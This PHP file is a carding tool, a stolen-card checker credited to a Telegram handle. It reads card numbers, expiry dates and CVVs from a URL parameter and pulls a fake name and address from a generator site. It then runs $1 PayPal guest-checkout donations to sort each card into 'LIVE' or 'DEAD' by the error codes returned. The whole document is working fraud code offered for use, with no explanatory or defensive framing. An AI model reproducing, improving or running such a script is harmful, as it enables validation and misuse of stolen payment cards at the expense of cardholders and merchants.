<?php

/// [This api has been written by @Xbinner2 Tg t.me/Xbinner2] ///

error_reporting(0);
set_time_limit(0);
date_default_timezone_set("America/New_York");

function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = isset($_GET["lista"]) ? $_GET["lista"] : false;
$auth1 = $_GET['auth'];
$auth = htmlspecialchars($auth1);
preg_match_all("!\d+!", $lista, $matches);
$cc = $matches[0][0];
$mes = $matches[0][1];
$ano = $matches[0][2];
$cvv = $matches[0][3];
$ccthree = "$cc|$mes|$ano|$cvv";

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

//////===[Randomizing Details Api]===//////
$rand = rand(0000, 9999);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://fakepersongenerator.com/Index/generate");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
$headers = [];
$headers[] =
    "User-Agent: Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:100.0) Gecko/100.0 Firefox/100.0";
$headers[] =
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$res = curl_exec($ch);
$name = trim(
    strip_tags(
        getStr($res, "class='text-center name'><b class='click'>", "</b>")
    )
);
$first = multiexplode(["&nbsp;"], $name)[0];
$last = multiexplode(["&nbsp;"], $name)[2];
$email = "" . $first . "" . $rand . "@yahoo.com";
$street = trim(strip_tags(getStr($res, "<p>Street: <b>", "</b>")));
$stct = trim(strip_tags(getStr($res, "<p>City, State, Zip: <b>", "</b>")));
$city = multiexplode([","], $stct)[0];
$statefull = multiexplode([","], $stct)[1];
$state = trim(strip_tags(getStr($statefull, "(", ")")));
$zip = multiexplode([","], $stct)[2];
$phone = trim(strip_tags(getStr($res, "title='test'>Mobile: <b>", "</b>")));

//////===[REQUEST 1 TYPE POST]===//////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.paypal.com/v2/checkout/orders");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
$headers = [];
$headers[] = "Host: www.paypal.com";
$headers[] = "Accept: application/json";
$headers[] =
    "Authorization: $auth";
$headers[] =
    "User-Agent: Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:100.0) Gecko/100.0 Firefox/100.0";
$headers[] = "Content-Type: application/json";
$headers[] = "Origin: https://www.paypal.com";
$headers[] = "Accept-Language: en-US,en;q=0.9";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . "/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . "/cookie.txt");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt(
    $ch,
    CURLOPT_POSTFIELDS,
    '{"purchase_units":[{"amount":{"currency_code":"USD","value":"1","breakdown":{"item_total":{"currency_code":"USD","value":"1"}}},"items":[{"name":"item name","unit_amount":{"currency_code":"USD","value":"1"},"quantity":"1","category":"DONATION"}],"description":"OHWA Donation"}],"intent":"CAPTURE","application_context":{}}'
);
$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1, '"id":"', '"')));

// [time sleep 4 second] //
sleep(10);

//////===[REQUEST 2 TYPE POST]===//////
$ch = curl_init();
curl_setopt(
    $ch,
    CURLOPT_URL,
    "https://www.paypal.com/graphql?fetch_credit_form_submit"
);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
$headers = [];
$headers[] = "Host: www.paypal.com";
$headers[] = "x-app-name: standardcardfields";
$headers[] = "x-country: US";
$headers[] = "Accept: */*";
$headers[] =
    "User-Agent: Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:100.0) Gecko/100.0 Firefox/100.0";
$headers[] = "Content-Type: application/json";
$headers[] = "Origin: https://www.paypal.com";
$headers[] = "Accept-Language: en-US,en;q=0.9";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . "/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . "/cookie.txt");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt(
    $ch,
    CURLOPT_POSTFIELDS,
    '{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"' .
        $id .
        '","card":{"cardNumber":"' .
        $cc .
        '","expirationDate":"' .
        $mes .
        "/" .
        $ano .
        '","postalCode":"' .
        $zip .
        '","securityCode":"' .
        $cvv .
        '"},"phoneNumber":"' .
        $phone .
        '","firstName":"' .
        $first .
        '","lastName":"' .
        $last .
        '","billingAddress":{"givenName":"' .
        $first .
        '","familyName":"' .
        $last .
        '","line1":"' .
        $street .
        '","line2":"","city":"' .
        $city .
        '","state":"' .
        $state .
        '","postalCode":"' .
        $zip .
        '","country":"US"},"shippingAddress":{"givenName":"' .
        $first .
        '","familyName":"' .
        $last .
        '","line1":"' .
        $street .
        '","line2":"","city":"' .
        $city .
        '","state":"' .
        $state .
        '","postalCode":"' .
        $zip .
        '","country":"US"},"email":"' .
        $email .
        '","currencyConversionType":"PAYPAL"},"operationName":null}'
);
$result = curl_exec($ch);
$code = trim(strip_tags(getStr($result, '"code":"', '"')));
$message = trim(strip_tags(getStr($result, '"message":"', '",')));

if (
    strpos($result, "EXISTING_ACCOUNT_RESTRICTED") ||
    strpos($result, "INVALID_SECURITY_CODE") ||
    strpos($result, "THANK YOU") ||
    strpos($result, 'status":"COMPLETED') ||
    strpos($result, "INVALID_BILLING_ADDRESS")
) {
    echo "<i style='color:green;font-size:15px;font-family:calibri ; '>#LIVE|$ccthree|[$code]|[PAYPAL-AUTH]|XBINNER</i>";
} elseif (
    strpos($result, "OAS_VALIDATION_ERROR") ||
    strpos($result, "INVALID_RESOURCE_ID")
) {
    echo "<i style='color:red;font-size:15px;font-family:calibri ; '>#DEAD|$ccthree|[$message]|{$code}[PAYPAL-AUTH]|XBINNER</i>";
} else {
    echo "<i style='color:red;font-size:15px;font-family:calibri ; '>#DEAD|$ccthree|[$message]|[PAYPAL-AUTH]|XBINNER</i>";
}

curl_close($ch);
ob_flush();

?>